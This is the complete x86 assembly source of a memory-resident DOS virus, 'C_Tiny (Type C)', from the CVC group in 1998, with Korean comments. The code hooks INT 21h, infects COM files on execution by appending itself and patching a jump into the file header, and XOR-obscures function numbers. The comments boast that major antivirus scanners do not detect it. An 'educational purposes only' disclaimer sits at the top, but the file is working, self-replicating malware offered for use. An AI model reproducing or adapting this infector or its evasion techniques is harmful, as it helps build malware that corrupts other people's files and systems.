;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                            \\\\\\\  \       \   \\\\\\\
;        C_Tiny    (Type C)                 \          \     \   \
;                                           \           \   \    \    98/05
;                                           \            \ \     \
;                                            \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : C_Tiny (Type C)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/21
; Type       : Memory resident COM
;
;  !*< 법률적 의무 >********************************************************!
;   *                                                                        *
;   * 경고 !                                                                 *
;   *        이 정보는 교육적인 목적으로만 사용되어야 합니다. 우리는 이      *
;   *        정보를 사용해서 발생하는 어떤 문제에 대해서도 책임을 지지 않    *
;   *        습니다. 모든 책임은 글을 읽는 사람에게 있습니다.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; 간단한 램상주 바이러스로 인터럽트 벡터 주소표에 상주한다. (0020:0000)
; 바이러스 상주전 이 영역에 데이터가 전혀 없어야 하다. 만약 이영역에 0 이 아닌
; 다른 값이 저장되어 있다면 바이러스는 기억장소에 상주 하지 않는다.
; 그리고, COM 파일만 감염시키며 감염 여부는 파일의 첫 부분이 'M' 인지 비교 한다
;
; AVP,DSAV,F-PROT,SCAN,TBAV 에서 현재 진단되지 않는다. 단, F-PROT 인공지능에는
; 진단이 된다. 다음버전에는 진단되지 않을 것이다.
;
; 인터럽트 벡터 테이블에 상주 하는 바이러스는 크기가 아주 작아야 한다.
;
; 본격적인 램상주 바이러스 제작에 앞서 제한적인 램상주방법인 인터럽트벡터 주소
; 표에 상주 하는 바이러스이다.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE
            .286

            org   0h

 Mem_size   equ   offset End_Memory     ; 메모리 크기
 Vir_size   equ   offset End_virus      ; 실제 바이러스 크기

 C_Tiny:
            mov   si, 100h
            push  si                    ; 저장
            mov   di, 0020h             ; AX = 0020h
            mov   es, di                ; ES = 0020h
            mov   cx, Mem_size          ; 바이러스 길이 만큼 비교
            xor   di, di                ; ES:DI = 0020:0000h
 Check_IVT_Zero:
            repz  scasb                 ; 0020:0000 ~ 바이러스 크기만큼 0 인지
            jnz   Restore_COM_Head      ; 비교한다.

 Copy_Vir_IVT:
            push  si
            mov   cl, Vir_size          ; 바이러스 길이
            xor   di,di                 ; 복사 할 곳 (0020:0000h)
            db    2Eh                   ; CS:SI -> ES:DI
            repz  movsb                 ; 복사 !
            pop   si                    ;

            xor   ax,ax
            mov   ds,ax
            mov   di, offset End_Virus
            mov   ax, offset NewInt21
            cli                         ; Int 21h 가로채기
            xchg  ax, ds:[0084h]
            stosw                       ; 세그먼트 변경
            mov   ax,0020h
            xchg  ax, ds:[0086h]
            stosw
            sti

 Restore_COM_Head:
            push  cs                    ; cs=ds=es
            pop   ds
            push  cs
            pop   es
            pop   si                    ; SI 복구
            add   si, offset OldCOMHead ; COM 앞부분 주소 계산
            mov   di,101h               ; COM 앞부분 복구
            dec   di                    ; DI = 100h
            push  di                    ; 이동할 주소 저장
            movsw                       ; 4 바이트 복구
            movsw                       ;
            ret                         ; CS:100h 로 이동

 OldCOMHead db    90h,90h,0CDh,20h      ; 원래 COM 앞부분
            db    'C_Tiny.C'            ; 바이러스 이름

 Set_Pnt:
            mov   ah,42h                ; 포인터
            xor   cx,cx
            cwd
            int   21h
            ret

 call_Int21:
            xor   ah,0F0h               ;
            int   21h                   ;
            ret

 NewInt21:
            pusha                       ; 286 + 에서 지원
            push  ds
            push  es

            xor   ah,4Bh                ; 실행인가 ?
            jnz   Error

            mov   ax, (3D02h XOR 0F000h) ; 파일 열기
            call  call_Int21
            jc    Error                 ; 열기 에러 ?

            xchg  ax,bx                 ; BX = 파일핸들

            push  cs                    ; 세그먼트 통일
            pop   ds
            push  cs
            pop   es

            mov   ah, (3fh XOR 0F0h)    ; 파일 읽기
            mov   cx, 4                 ; 바이트수
            mov   dx, offset OldCOMHead ; 버퍼 주소
            call  call_Int21

            cmp   byte ptr OldCOMHead, 'M' ; 감염되었나 / EXE 파일인가 ?
            jz    Close

            mov   al,2                  ; 파일 끝으로 이동
            call  Set_Pnt
            mov   word ptr C_Tiny+1, ax
            add   word ptr C_Tiny+1, 100h
            mov   word ptr Jump_Code, 0E94Dh ; 식별자 + 점프값
            sub   ax,0004               ; 점프값 계산
            mov   word ptr Jump_Code + 2, ax ;

            mov   ah, (40h XOR 0F0h)    ; 바이러스 쓰기
            mov   cx, offset End_Virus  ; 바이러스 길이
            xor   dx,dx                 ; 버퍼 오프셋
            call  call_Int21

            xor   al,al                 ; 파일 처음으로 이동
            call  Set_Pnt

            mov   ah, (40h XOR 0F0h)    ; 앞부분 쓰기
            mov   cx, 4                 ; 바이트 수
            mov   dx, offset Jump_Code  ; 오프셋
            call  call_Int21

 Close:
            mov   ah, (3Eh XOR 0F0h)    ; 파일 닫기
            call  call_Int21
 Error:
            pop   es
            pop   ds
            popa
 Jmp_Org_Int21:
            db    0EAh                  ; --> 여기까지 파일에 저장
 End_Virus:
            dw    ?,?
 Jump_Code  dw    ?
            db    ?,?

 End_Memory:                            ; 메모리에서 바이러스 끝
            END   C_Tiny

